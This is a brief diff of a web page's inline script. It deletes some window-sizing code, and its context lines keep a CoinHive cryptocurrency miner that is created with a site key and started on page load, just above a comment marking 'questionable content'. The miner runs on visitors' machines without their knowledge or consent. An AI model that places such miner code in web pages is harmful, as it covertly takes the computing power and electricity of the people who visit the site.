@@ -50,10 +50,6 @@
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
 	      miner.start();
 
-        //Size main
-        var height = $(window).height() - 25;
-        var it = document.getElementById("threads");
-        it.height(height);
     </script>
     <!-- End questionable content -->
 
